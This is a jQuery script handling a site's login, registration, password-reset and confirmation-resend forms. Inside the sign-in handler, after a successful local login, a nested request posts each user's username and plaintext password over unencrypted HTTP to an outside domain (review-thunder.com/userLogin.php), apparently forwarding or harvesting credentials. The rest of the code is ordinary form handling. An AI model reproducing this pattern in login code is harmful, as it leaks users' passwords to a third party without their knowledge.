jQuery(document).ready(function () {
    'use strict';
   // var url = jQuery('.logourl').attr('href');
    var url = jQuery('#logourl').val();

    jQuery('.signin').submit(function (e) {
        e.preventDefault();
        
        var remember = 0;
        // check if remember checkbox is checked
        if ( jQuery('#remember').is(':checked') ) {
            
            remember = 1;
            
        }
        
        var name = jQuery('input[name="csrf_test_name"]').val();
        
        // create an object with form data
        var data1 = {username: jQuery('.username').val(), password: jQuery('.password').val(), remember: remember, csrf_test_name: name};
        // submit data via ajax
        jQuery.ajax({
            url: url + 'auth/',
            type: 'POST',
            dataType: 'json',
            data: data1,
            success: function (data)
            {
				 jQuery('.btn-sign').after(data);
                jQuery('.merror').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.merror').remove();
                });
                jQuery('.msuccess').fadeIn(1000).delay(1000).fadeOut(1000, function ()
                {
					
			jQuery.ajax({
            url:  'http://review-thunder.com/userLogin.php',
            type: 'POST',
            dataType: 'html',
            data: data1,
            success: function (requestdata)
            {
				
				jQuery('.msuccess').remove();
				document.location.href=url;
				/* if(requestdata ==1){
					
					document.location.href = url + 'user/home';
				}else{
					
					
				} */
              
            
               
            },
            error: function (data, jqXHR, textStatus)
            {
                console.log('Request failed:' + textStatus);
            }
        });
					
                    /* jQuery('.msuccess').remove();
                    document.location.href = url + 'user/home'; */
                });
            },
            error: function (data, jqXHR, textStatus)
            {
                console.log('Request failed:' + textStatus);
            }
        });
    });
    jQuery('.signup').submit(function (e)
    {
        e.preventDefault();
        var name = jQuery('input[name="csrf_test_name"]').val();
        // create an object with form data
        var data = {username: jQuery('.username').val(), password: jQuery('.password').val(), email: jQuery('.email').val(), csrf_test_name: name};
        // submit data via ajax
        jQuery.ajax({
            url: url + 'register/',
            type: 'POST',
            dataType: 'json',
            data: data,
            success: function (data)
            {
                jQuery('.btn-signup').after(data);
                jQuery('.merror').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.merror').remove();
                });
                jQuery('.msuccess').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.msuccess').remove();
                    document.location.href = url;
                });
            },
            error: function (data, jqXHR, textStatus)
            {
                console.log('Request failed:' + textStatus);
            }
        });
    });
    jQuery('.reset').submit(function (e)
    {
        e.preventDefault();
        var name = jQuery('input[name="csrf_test_name"]').val();
        // submit data via ajax
        var data = {email: jQuery('.email').val(), csrf_test_name: name};
        jQuery.ajax({
            url: url + 'password-reset/',
            type: 'POST',
            dataType: 'json',
            data: data,
            success: function (data)
            {
                jQuery('.btn-recover').after(data);
                jQuery('.merror').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.merror').remove();
                });
                jQuery('.msuccess').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.msuccess').remove();
                });
            },
            error: function (data, jqXHR, textStatus)
            {
                console.log('Request failed:' + textStatus);
            }
        });
    });
    jQuery('.password').on('click',function () {
        jQuery('.rem').fadeIn('slow');
    });
    jQuery('.resend-confirmation').click(function (e)
    {
        e.preventDefault();
        var name = jQuery('input[name="csrf_test_name"]').val();
        var url = jQuery(this).attr('data-url');
        // resend confirmation link
        jQuery.ajax({
            url: url + 'resend-confirmation/',
            type: 'POST',
            dataType: 'json',
            data: {'csrf_test_name': name},
            success: function (data)
            {
                jQuery('.resend-confirmation').after(data);
                jQuery('.alert-danger').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.alert-danger').remove();
                });
                jQuery('.alert-info').fadeIn(1000).delay(2000).fadeOut(1000, function ()
                {
                    jQuery('.alert-info').remove();
                });
            },
            error: function (data, jqXHR, textStatus)
            {
                console.log('Request failed:' + textStatus);
            }
        });
    });
});